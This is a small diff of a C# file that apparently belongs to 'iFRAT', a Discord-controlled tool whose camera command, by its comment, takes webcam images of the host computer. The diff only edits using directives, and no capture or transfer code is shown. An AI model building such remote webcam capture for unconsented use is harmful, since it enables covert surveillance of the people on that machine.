@@ -1,16 +1,15 @@
 using Discord;
-using Discord.Interactions;
-using Discord.Rest;
 using Discord.WebSocket;
+
 using Emgu.CV;
 using Emgu.CV.Structure;
+
 using iFRAT.Extensions;
-using Masked.DiscordNet.Extensions;
-using Spectre.Console;
 
 namespace iFRAT.Commands;
 
 #pragma warning disable MA0004 // Disable -> Use ConfigurateAwait(false); as no SyncCtx is needed.
+
 /// <summary>
 /// The Camera Command. Allows to take an image of what the Webcam of the computer can see
 /// </summary>
